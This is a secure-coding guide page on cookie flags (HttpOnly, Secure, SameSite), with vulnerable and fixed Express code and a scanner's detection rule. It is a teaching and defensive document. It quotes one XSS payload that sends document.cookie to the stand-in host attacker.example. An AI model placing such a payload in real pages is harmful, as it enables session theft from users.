---
title: Cookie flags (httpOnly, secure, sameSite)
slug: cookie-security
type: pattern
last_updated: 2026-05-12
draft: false
related_probe_ids:
  - Cookie Security
sources:
  - title: MDN — Set-Cookie
    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie
  - title: OWASP — Session Management Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
  - title: CWE-1004 — Sensitive Cookie Without HttpOnly Flag
    url: https://cwe.mitre.org/data/definitions/1004.html
  - title: CWE-614 — Sensitive Cookie in HTTPS Session Without Secure Attribute
    url: https://cwe.mitre.org/data/definitions/614.html
summary: Auth cookies missing `httpOnly`, `secure`, or `sameSite` give an XSS one-click access to user sessions plus CSRF on every request. Three flags, set them all.
---

## What this is

Three cookie attributes that bound the blast radius of common attacks:

- **`HttpOnly`**: blocks JavaScript from reading the cookie (`document.cookie`). An XSS that lands on the page cannot exfiltrate the cookie.
- **`Secure`**: only sends the cookie over HTTPS. Defeats network sniffers on plaintext links.
- **`SameSite`** (`Strict`, `Lax`, or `None`): controls when the browser sends the cookie on cross-site requests. `Lax` (or `Strict`) is the CSRF defense built into the browser.

An auth cookie missing any of these is a finding. Missing all three is a security disaster.

## Why it matters

Without `HttpOnly`: any XSS becomes session theft. A single `<script>fetch('https://attacker.example/?c='+document.cookie)</script>` exfiltrates the session token.

Without `Secure`: any plaintext HTTP path (including `http://` redirects, mixed-content images, a misconfigured CDN edge) sends the cookie in the clear. A network attacker grabs it.

Without `SameSite`: a malicious site can make the user's browser send a request to your domain with the cookie attached. The browser does not distinguish "user clicked submit" from "third-party page triggered the request." CSRF is the result.

## What the failure looks like

PreFlight scans server-side cookie-setting code for cookies whose name matches an auth signal (`session`, `auth`, `token`, `jwt`, `csrf`) and which are set without all three flags:

```ts
res.cookie('session', token); // all three missing — critical
res.cookie('auth', token, { secure: true }); // httpOnly + sameSite missing
res.cookie('jwt', token, { httpOnly: true, secure: true }); // sameSite missing
```

## What the fix looks like

Set all three flags on every auth cookie. The boilerplate:

```ts
res.cookie('session', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax', // 'strict' if you don't need cross-site form posts
  maxAge: 60 * 60 * 24 * 30, // 30 days; rotate often
  path: '/',
});
```

In raw `Set-Cookie` header form:

```
Set-Cookie: session=abc123; Max-Age=2592000; Path=/; HttpOnly; Secure; SameSite=Lax
```

A note on `SameSite=None`: this is the only mode where the cookie is sent on every cross-site request, and it requires `Secure`. Use it only when you genuinely need cross-site auth (an OAuth callback, an embedded widget). Never as a default.

## Related

- [Client auth storage](/learn/patterns/client-auth-storage) covers the alternative pattern of storing tokens in localStorage, and why cookies (with all three flags) are usually the safer choice.
- [Security headers](/learn/patterns/security-headers) covers the response-header hardening that pairs with cookie flags.

## Sources

MDN's Set-Cookie doc is the authoritative reference for cookie attributes. OWASP's session management cheat sheet covers the broader session-handling discipline. CWE-1004 and CWE-614 name the vulnerability classes for missing HttpOnly and Secure respectively.
